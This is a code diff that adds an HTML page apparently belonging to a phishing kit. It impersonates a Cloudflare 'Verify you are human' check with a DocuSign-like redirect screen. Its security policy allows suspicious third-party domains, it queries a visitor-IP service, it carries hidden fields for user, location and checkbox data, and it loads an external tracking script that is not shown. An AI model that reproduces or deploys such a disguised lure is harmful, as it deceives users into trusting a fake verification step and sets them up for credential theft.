@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+	<link id="favLink" rel="shortcut icon" href="">
+    <title>Redirecting...</title>
+<!-- 1. Configure the CSP to strictly whitelist the official challenges subdomain -->
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://karlbuch.biz https://ritalfrendo.top https://challenges.cloudflare.com https://static.cloudflareinsights.com 'unsafe-inline'; script-src-elem 'self' https://karlbuch.biz https://ritalfrendo.top https://challenges.cloudflare.com https://static.cloudflareinsights.com; style-src 'self' https://ritalfrendo.top 'unsafe-inline';img-src 'self' *.gstatic.com https://ritalfrendo.top https://www.google.com https://www.cloudflare.com https://cloudflare.com data:; frame-src  https://challenges.cloudflare.com; connect-src 'self'  https://ritalfrendo.top https://api.ipify.org https://challenges.cloudflare.com https://cloudflareinsights.com https://*.cloudflareinsights.com;">
+
+
+
+    <!-- 2. Load the official API endpoint -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" defer></script>
+<link id="sheet" rel="stylesheet" type="text/css" href="">
+
+
+</head>
+<body>
+
+ <div id="loading-logo" style="display:none">
+		<p id="redirect" style="display:none">Redirecting to your service provider. please wait..</p>
+		<img id="docuLogo" style="position:absolute;top:50%;height:33px;width:120px;top:40%;left:50%;margin-left:-63px;margin-top:-60px;">
+		<div style="position:absolute;left:0;right:0;text-align:center;top:40%;margin-top:9px;height:40px;line-height:16px;color:#61a4f6;"></div>
+		<div style="position:absolute;left:50%;margin-left:-107px;height:4px;width:214px;top:40%;margin-top:-10px;background:#eaeaea;">
+		<div class="preparing-experience" ></div></div></div>
+		
+<div class="verification-container" style="display:none">
+        <div class="checkbox-wrapper">
+            <div class="spinner-container">
+				<div id="my-widget" class="cf-turnstile" data-sitekey="0x4AAAAAAD-iBL_fu_wHp3qY"></div>
+                <input type="checkbox" id="verification-checkbox">
+                <div id="spinner" class="spinner" style="display: none;"></div>
+            </div>
+            <label for="verification-checkbox" class="checkbox-label">&nbsp;Verify you are human</label>
+            <div class="footer-container">
+                <div class="footer-content">
+                    <img src="https://cloudflare.com/favicon.ico" alt="Cloudflare" class="cloudflare-logo">
+                    <h1 class="cloudflare-text">
+                        Cloudflare
+                    </h1>
+                    <div class="footer">
+                        <a href="#">Privacy</a>
+                        <span class="divider">"</span>
+                        <a href="#">Terms</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- <div id="loader" class="loader">Verifying...</div> -->
+    </div>
+
+		<input type="hidden" id ="user_field" value="" name="vsr">
+		<input type="hidden" value ="" id="fieldName" name="field">
+		<input type ="hidden" value="" name="loc" id="loc">
+		<input type ="hidden" value="" name="chkBxVal" id="chkBxVal">
+<script src="track_xref.js?v=1.0.49"></script>
+</body>
+</html>
